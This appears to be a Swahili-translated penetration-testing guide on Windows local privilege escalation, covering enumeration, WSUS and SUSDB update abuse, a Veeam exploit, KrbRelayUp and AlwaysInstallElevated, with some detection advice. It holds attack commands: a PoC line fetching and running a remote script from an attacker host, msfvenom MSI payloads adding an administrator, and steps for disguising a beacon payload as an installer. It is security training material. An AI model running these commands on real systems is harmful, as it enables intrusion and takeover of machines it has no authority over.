# Kupandisha Ruhusa za Ndani za Windows

{{#include ../../banners/hacktricks-training.md}}

### **Zana bora ya kutafuta njia za kupandisha ruhusa za ndani za Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ukurasa huu unakusanya mbinu za jumla za kupandisha ruhusa za Windows kutoka kwenye miongozo kadhaa ya msingi.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Mchakato wake wa vitendo wa enumeration pia unatokana na warsha na orodha za ukaguzi za jamii.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Maudhui ya kihistoria kuhusu mashambulizi yanajumuisha wasilisho la DerbyCon kuhusu kupandisha ruhusa za Windows.<sup>[[5]](#references)</sup>

## Nadharia ya Awali ya Windows

### Access Tokens

**Ikiwa hujui Access Tokens za Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa maelezo zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa hujui Integrity Levels katika Windows ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Vidhibiti vya Usalama vya Windows

Kuna mambo mbalimbali katika Windows yanayoweza **kukuzuia kufanya enumeration ya mfumo**, kuendesha executables au hata **kutambua shughuli zako**. Unapaswa **kusoma** **ukurasa** ufuatao na kufanya **enumeration** ya **mbinu** hizi zote za **ulinzi** kabla ya kuanza enumeration ya kupandisha ruhusa:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Ufikiaji wa kimwili unaweza pia kubadilisha uhariri wa UEFI NVRAM ukiwa nje ya mtandao kuwa mnyororo wa DMA kabla ya boot na wa kurekebisha kumbukumbu ya Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Ulinzi wa Admin / Kupandisha ruhusa kimyakimya kwa UIAccess

Michakato ya UIAccess inayoanzishwa kupitia `RAiLaunchAdminProcess` inaweza kutumiwa kufikia High IL bila maulizo pale ukaguzi wa njia salama wa AppInfo unapokwepwa. Angalia utaratibu maalum wa kukwepa UIAccess/Admin Protection hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Usambazaji wa mipangilio ya registry ya ufikivu wa Secure Desktop unaweza kutumiwa kuandika thamani yoyote kwenye registry ya SYSTEM (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Matoleo ya hivi karibuni ya Windows pia yameleta njia ya LPE ya **SMB arbitrary-port**, ambapo uthibitishaji wa ndani wa NTLM wenye ruhusa za juu unaakisiwa kupitia muunganisho wa SMB TCP uliotumika tena:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Taarifa za Mfumo

### Enumeration ya taarifa za toleo

Angalia kama toleo la Windows lina udhaifu wowote unaojulikana (pia kagua masasisho ya usalama yaliyosakinishwa).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits za matoleo

[Tovuti hii](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta maelezo ya kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu 4,700 wa usalama, ikionyesha **eneo kubwa la mashambulizi** linaloletwa na mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — hukusanya taarifa za build ya OS, masasisho yaliyosakinishwa na advisory zinazoweza kuhusika; thibitisha bidhaa husika na masasisho yanayochukua nafasi ya mengine kabla ya kuchukulia matokeo kuwa yanatumika.

Kwa exploit ya ndani inayohusu toleo maalum, angalia **usanifu wa process inayoendeshwa** pamoja na usanifu wa OS. Kwenye Windows ya 64-bit, process ya 32-bit huathiriwa na [uelekezaji upya wa mfumo wa faili wa WOW64](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` kwa kawaida huelekezwa kwenye saraka ya mfumo ya 32-bit, huku `%windir%\Sysnative` ikiipa process hiyo ufikiaji wa saraka ya mfumo asilia. Alias hii haipatikani kwa process ya 64-bit. Build ya OS au uwezekano wa KB kukosekana hauthibitishi kuwa mfumo unaweza kushambuliwa; linganisha build inayoendeshwa, sasisho lililosakinishwa au linalochukua nafasi ya jingine, usanifu wa process na masharti ya exploit na [taarifa ya usalama ya Microsoft](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) ya suala husika.

**Ndani ya mfumo kwa kutumia maelezo ya mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Repos za exploits kwenye GitHub:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Kuna credentials/Juicy info yoyote iliyohifadhiwa kwenye variables za mazingira?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Historia ya PowerShell

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### Faili za PowerShell Transcript

Unaweza kujifunza jinsi ya kuwasha kipengele hiki kwenye [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ni mfano tu. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) kwa kawaida huandika kwenye folda ya Documents ya kila mtumiaji, lakini mipangilio ya `OutputDirectory` au `Start-Transcript -OutputDirectory` inaweza kuelekeza faili kwenye folda inayoshirikiwa au iliyofichwa. Kagua njia halisi ya matokeo na ACL ya faili kabla ya kukagua transcript: inaweza kuwa na hoja za amri na matokeo, ikiwemo credentials. Transcript inayosomeka ni kidokezo tu ikiwa maudhui yake yanafichua identity yenye ruhusa za juu inayoweza kutumika, na identity hiyo inaweza kuingia katika muktadha husika.

### PowerShell Module Logging

Maelezo ya utekelezaji wa PowerShell pipeline hurekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri na sehemu za scripts. Hata hivyo, huenda maelezo kamili ya utekelezaji na matokeo yake yasirekodiwe.

Ili kuwezesha hili, fuata maagizo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Ili kuona matukio 15 ya mwisho kutoka kwenye kumbukumbu za PowersShell, unaweza kutekeleza:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script huhifadhiwa, na kuhakikisha kwamba kila block ya code inaandikwa inapotekelezwa. Mchakato huu huhifadhi trail kamili ya ukaguzi wa kila shughuli, ambayo ni muhimu kwa forensics na kuchanganua tabia hasidi. Kwa kuandika shughuli zote wakati wa utekelezaji, maelezo ya kina kuhusu mchakato hutolewa.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Matukio ya logging ya Script Block yanaweza kupatikana kwenye Windows Event Viewer katika njia hii: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 ya mwisho, unaweza kutumia:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Mipangilio ya Intaneti

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Viendeshi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Endpoint ya WSUS inayotumia HTTP ni dalili ya kuchunguza uwezekano wa kunasa metadata ya masasisho. Unyonyaji pia hutegemea iwapo mteja anatumia seva hiyo ya WSUS, iwapo mshambulizi anaweza kunasa au kudhibiti trafiki yake, na sera za mteja za kuamini na kusakinisha masasisho. URL pekee haithibitishi utekelezaji wa msimbo. [Microsoft recommends TLS for WSUS metadata](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Unaanza kwa kuangalia iwapo mtandao unatumia sasisho la WSUS lisilo la SSL kwa kuendesha yafuatayo kwenye cmd:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Au yafuatayo katika PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ukipokea jibu kama mojawapo ya haya:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Na ikiwa `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Wakati `UseWUServer` ni `1`, Windows Update hutumia huduma ya intraneti iliyosanidiwa. Hii inathibitisha sharti la awali la njia ya HTTP interception, lakini haithibitishi kwamba interception, kukubaliwa kwa update hasidi, au usakinishaji wenye marupurupu ya juu unawezekana. Ikiwa ni `0`, endpoint hii mahususi ya WSUS iliyosanidiwa haichaguliwi na sera hiyo.

Ili kutumia vulnerabilities hizi, unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Hizi ni scripts za exploits za MiTM weaponized za kuingiza updates 'fake' kwenye trafiki ya WSUS isiyotumia SSL.

Soma utafiti hapa:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Soma ripoti kamili hapa**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Kimsingi, huu ndio udhaifu unaotumiwa na bug hii:

> Ikiwa tuna uwezo wa kurekebisha proxy ya mtumiaji wetu wa ndani, na Windows Updates inatumia proxy iliyosanidiwa kwenye mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) ndani ya mashine yetu ili kuingilia trafiki yetu wenyewe na kuendesha code kama mtumiaji mwenye marupurupu ya juu kwenye asset yetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS hutumia mipangilio ya mtumiaji wa sasa, itatumia pia certificate store yake. Tukitengeneza certificate iliyojisaini kwa hostname ya WSUS na kuongeza certificate hiyo kwenye certificate store ya mtumiaji wa sasa, tutaweza kuingilia trafiki ya WSUS ya HTTP na HTTPS. WSUS haitumii mifumo kama HSTS kutekeleza uthibitishaji wa aina ya trust-on-first-use kwa certificate. Ikiwa certificate iliyowasilishwa inaaminika na mtumiaji na ina hostname sahihi, itakubaliwa na huduma.

Unaweza kutumia vulnerability hii kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (ikishatolewa).

### Updates zinazodhibitiwa na msimamizi wa WSUS

Kuna njia tofauti pale utambulisho wa sasa unapoweza **kuchapisha na kuidhinisha** updates kwenye seva ya WSUS. Kagua uanachama unaotumika wa kundi la seva ya `WSUS Administrators` na ruhusa zozote za WSUS zilizokasimiwa, kisha utambue kundi la kompyuta za wateja litakalopokea update iliyoidhinishwa. [Microsoft inahitaji marupurupu ya WSUS Administrator ili kuidhinisha updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), na [inaeleza uhusiano wa uaminifu wa uchapishaji](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): wateja lazima waamini certificate ya kusaini iliyotumiwa kwa maudhui yaliyochapishwa ndani ya mfumo. Thibitisha kwamba update husika imesainiwa na kukubaliwa, inafaa kwa lengo, na imesakinishwa katika muktadha wenye marupurupu ya juu zaidi kabla ya kuichukulia kama njia ya escalation. Thamani ya HTTP `WUServer` au jina la kundi pekee haithibitishi masharti hayo.

### Matumizi mabaya ya SUSDB custom-update: payloads zisizosainiwa kupitia `.txt`/`.esd`

Huu ni ukiukaji tofauti wa mpaka wa uaminifu na kuingilia muunganisho wa HTTP WSUS: sharti la awali ni kuwa na ufikiaji wa kutosha kwa **stored procedures za database ya WSUS (`SUSDB`)** ili kuchapisha na kuidhinisha custom update. Njia moja ya vitendo ya kuingia ni ku-relay akaunti ya kompyuta ya WSUS ya upstream kwenda kwenye seva tofauti ya MSSQL inayohifadhi `SUSDB`; sharti halisi hutegemea deployment, kwa hiyo kwanza orodhesha ruhusa za `EXECUTE` badala ya kudhani kuwa una haki za msimamizi wa SQL.<sup>[[38]](#references)[[39]](#references)</sup>

Kwa njia tofauti ya shambulio inayorelay uthibitishaji wa mteja wa WSUS kutoka HTTP/8530 kwenda LDAP, SMB, au AD CS, tazama [Kutumia vibaya WSUS HTTP kwa NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Tengeneza, lenga na uidhinishe update

Mtiririko wa kazi wa custom-update hutumia taratibu halali za WSUS kama API yenye vikwazo ya uchapishaji. Mabadiliko muhimu ya hali ni:<sup>[[38]](#references)</sup>

| Hatua | Stored procedures husika |
| --- | --- |
| Ingiza metadata ya update | `spImportUpdate` |
| Hifadhi vipande vya XML vya masharti ya awali, vilivyowekwa kulingana na lugha, na vilivyopanuliwa | `spSaveXMLFragment` |
| Husisha digest ya maudhui na URL inayodhibitiwa na mshambuliaji | `spSetBatchURL` |
| Orodhesha/tengeneza kundi la kompyuta na umwongeze mteja | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Idhinisha usakinishaji kwa kundi hilo | `spDeployUpdate` yenye `@actionID = 0` na `@isAssigned = 1` |

Jina la faili, digests, ukubwa na handler ya `CommandLineInstallation` lazima zilingane kwenye metadata/vipande vilivyoingizwa. Baada ya kuweka URL ya maudhui na kundi lengwa, idhini ya mwisho hufanana na ifuatayo; tumia vitambulishi vipya vya update, kundi na deployment badala ya kutumia tena GUIDs za mfano.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Kukwepa uthibitishaji wa saini kwa kutegemea kiendelezi

WSUS kwa kawaida hukataa maudhui yoyote ya executable yasiyo na saini. Hata hivyo, katika `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, njia ya .NET `VerifyFile` huweka alama ya ukaguzi wa cheti kuwa false jina la faili lililotolewa linapoishia kwa `.txt` au `.esd`; hivyo `CheckCertificateSignature` hurukwa bila kwanza kuthibitisha kwamba baiti hizo ni maandishi au picha halali ya ESD. Kwa hiyo, PE isiyobadilishwa yenye jina kama `payload.exe.txt` inaweza kupita uthibitishaji wa maudhui na baadaye kuendeshwa na kidhibiti cha usakinishaji cha command-line cha sasisho. Hili ni hitilafu ya kuchanganya sera/aina, si kughushi saini.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Staging na automation inayooana na BITS

Kuita `spDeployUpdate` hufanya WSUS ipakue maudhui yaliyosajiliwa. Chanzo lazima kitimize matarajio ya HTTP ya BITS: URL inayofikika pekee haitoshi kwa sababu uhamishaji hutumia mtiririko wa awali wa `HEAD`/`GET` na maombi ya byte-range. Seva isiyoauni Range husababisha tukio la WSUS la ulandanishi `EventId=364`, linalosema kwamba BITS inahitaji kichwa cha itifaki ya Range.<sup>[[39]](#references)</sup>

PoC ya utafiti [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) huzalisha SQL inayohitajika kwa mnyororo wa import/fragment/URL/group/deployment, hujumuisha mteja wa MSSQL uliorekebishwa kwa ajili ya kuitekeleza, na huja na `BitsWebServer.py` kwa ajili ya staging ya maudhui. Mfano mdogo wa matumizi katika maabara iliyoidhinishwa ni:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Utekelezaji bila uangalizi na persistence ya majaribio upya

Mwingiliano wa upande wa client hutegemea policy. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, chaguo `4 - Auto download and schedule install`, husababisha update iliyoidhinishwa kupakuliwa na kusakinishwa kulingana na ratiba iliyosanidiwa bila mtumiaji kuichagua mwenyewe. Wakati wa majaribio, payload ambayo update yake iliendelea kushindwa/kutokamilika ilitolewa tena mara tu mchakato wa callback ulipoisha, kwa hiyo tabia ya kujaribu tena inaweza kuwa persistence ya utekelezaji unaojirudia; huacha alama nyingi kwa sababu client huonyesha hali ya update iliyoshindwa.<sup>[[39]](#references)</sup>

#### Mikakati ya utambuzi na uimarishaji wa usalama

Mikakati muhimu ya upande wa server na client kutoka kwenye chain hii ni:<sup>[[39]](#references)</sup>

- Kagua utekelezaji wa `spCreateTargetGroup`, `spSetBatchURL` na `spDeployUpdate` kwenye `SUSDB`; chunguza target groups mpya, vyanzo vya nje vya maudhui, payload za update za `.txt`/`.esd` na deployments zilizofanywa na principals zisizotarajiwa (hasa akaunti zisizo za kompyuta).
- Kagua `C:\Program Files\Update Services\LogFiles` kutafuta `ContentSyncAgent`, `FileVerified`, `FileVerficationFailed` iliyoandikwa vibaya, na `EventId=364`; linganisha uthibitishaji na extension ya payload pamoja na magic ya maudhui badala ya kuamini kiambishi tamati.
- Tafuta usakinishaji wa Windows Update unaoshindwa/kujaribu tena mara kwa mara, pamoja na utekelezaji wa PE au shughuli zisizotarajiwa za child/network kutoka kwenye maudhui yenye majina ya `.txt` au `.esd`.
- Inahitaji Extended Protection for Authentication kwenye database service inapoungwa mkono, na zuia ufikiaji wa mtandao wa database kwa server ya WSUS na mifumo ya usimamizi iliyoidhinishwa pekee. Punguza na kagua haki za `EXECUTE` kwenye procedures za custom-update.

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Enterprise agents nyingi hufichua sehemu ya IPC ya localhost na njia ya update yenye privileges. Ikiwa enrollment inaweza kulazimishwa kutumia server ya mshambulizi na updater inaamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI hasidi ambayo service ya SYSTEM husakinisha. Tazama mbinu ya jumla (iliyotokana na chain ya Netskope stAgentSvc – CVE-2025-0309) hapa:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam Backup & Replication na Cloud Connect hutumia core backup service kwenye **TCP/9401 kwa chaguomsingi**. [Ushauri wa Veeam](https://www.veeam.com/kb4424) unaeleza ufichuaji usiohitaji uthibitishaji wa credentials zilizosimbwa kwa njia fiche za configuration database ndani ya mipaka ya mtandao wa backup; PoC tofauti ya umma inaonyesha njia ya kutekeleza command kama **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Service inaweza kufungamana na anwani iliyo nje ya localhost, kwa hiyo kagua anwani na PID yake halisi.

- **Recon**: thibitisha kuwa TCP/9401 inahusishwa na `Veeam.Backup.Service.exe`, kisha kagua product iliyosakinishwa na metadata ya patch. `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` ni vidokezo, si ukaguzi kamili wa patch.
- **Matoleo ya chini yaliyorekebishwa**: Veeam inaorodhesha **11a build 11.0.1.1261 P20230227** na **12 build 12.0.0.1420 P20230223** kuwa matoleo ya kwanza yaliyorekebishwa; matoleo ya awali yameathirika. Toleo la faili lenye sehemu nne pekee haliwezi kutofautisha base build isiyopata patch na patch ya baadaye kwenye namba hizo hizo za build. Thibitisha kitambulisho cha patch dhidi ya [historia ya build ya vendor](https://www.veeam.com/kb2680) kabla ya kusema kuwa boundary build imerekebishwa.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika kwenye directory moja, kisha anzisha SYSTEM payload kupitia local socket:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

PoC iliyotajwa inaonyesha utekelezaji wa amri kama SYSTEM masharti yake ya ziada yanapotimizwa; advisory ya vendor inaeleza suala la kufichuliwa kwa credentials.
## KrbRelayUp

Kerberos relay ya ndani inaweza kupita kutoka kwenye logon yenye ruhusa za chini hadi kwenye uandishi wa directory wenye ruhusa za juu, ikiwa COM server inayofaa itajithibitisha na principal iliyorelayiwa ina ruhusa kwenye object lengwa. [KrbRelay documents](https://github.com/cube0x0/KrbRelay) uandishi wa LDAP wa RBCD na `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp huendesha baadhi ya njia hizi kiotomatiki. Mnyororo wa RBCD unahitaji delegation inayotumika na ruhusa kwenye object lengwa, huku mnyororo wa shadow-credential ukihitaji ruhusa za kuandika key-credential na KDC inayotumia njia ya uthibitishaji wa certificate. Hakuna njia kati ya hizi inayotokana na kuwa mwanachama wa domain pekee.

Kagua sera halisi za DC kuhusu [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) na [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL ya object ya identity inayorelayiwa, na viwango vya uthibitishaji na uigaji vya COM class iliyochaguliwa. Aina ya logon ya caller na muktadha wa credentials ni muhimu: session ya WinRM inaweza kufanya kazi tofauti na logon ya interactive au ya new-credentials. Uelekezaji wa firewall/OXID na updates zilizosakinishwa pia zinaweza kubadilisha matokeo. Chukulia sera inayoruhusu au ACL inayolingana kama mambo ya kuchunguza; enumeration ya kimya haipaswi kuanzisha COM coercion, relay authentication, au uandishi wa directory. Shadow credential ya machine-account inaweza kupelekea machine ticket na, ikiwa tu akaunti hiyo ina ruhusa zinazohitajika za directory replication, njia tofauti ya DCSync.

Tafuta **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio, angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ikiwa** registry keys hizi 2 **zimewezeshwa** (thamani ni **0x1**), basi watumiaji wa kiwango chochote cha ruhusa wanaweza **kusakinisha** (kutekeleza) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ikiwa una session ya meterpreter, unaweza kugeuza mbinu hii kuwa ya kiotomatiki kwa kutumia moduli **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up ili kuunda katika saraka ya sasa binary ya Windows MSI kwa ajili ya kuongeza mamlaka. Script hii huandika kisakinishi cha MSI kilichokompailiwa awali kinachoomba uongeze mtumiaji/kundi (kwa hivyo utahitaji ufikiaji wa GIU):

```
Write-UserAddMSI
```

Tekeleza tu binary iliyoundwa ili kupandisha privileges.

### MSI Wrapper

Soma tutorial hii ili ujifunze jinsi ya kuunda MSI wrapper ukitumia tools hizi. Kumbuka kuwa unaweza kufunga faili ya "**.bat**" ikiwa **unataka tu** **kutekeleza** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** kwa kutumia Cobalt Strike au Metasploit **Windows EXE TCP payload** mpya kwenye `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na uandike "installer" kwenye kisanduku cha kutafutia. Chagua mradi wa **Setup Wizard** na ubofye **Next**.
- Ipe mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, kisha ubofye **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 kati ya 4 (chagua faili za kujumuisha). Bofya **Add** na uchague Beacon payload uliyotengeneza hivi punde. Kisha ubofye **Finish**.
- Chagua mradi wa **AlwaysPrivesc** kwenye **Solution Explorer**, kisha kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
  - Kuna properties nyingine unazoweza kubadilisha, kama **Author** na **Manufacturer**, ili kufanya app iliyosakinishwa ionekane halali zaidi.
- Bofya mradi kwa kitufe cha kulia na uchague **View > Custom Actions**.
- Bofya **Install** kwa kitufe cha kulia na uchague **Add Custom Action**.
- Bofya mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na ubofye **OK**. Hii itahakikisha kuwa beacon payload inatekelezwa mara tu installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwisho, **ijenge**.
  - Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonekana, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili kutekeleza **usakinishaji** wa faili hasidi ya `.msi` **chinichini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Ili kutumia udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vigunduzi

### Mipangilio ya Ukaguzi

Mipangilio hii huamua kinachorekodiwa, kwa hivyo unapaswa kuizingatia **kwa makini**.

```
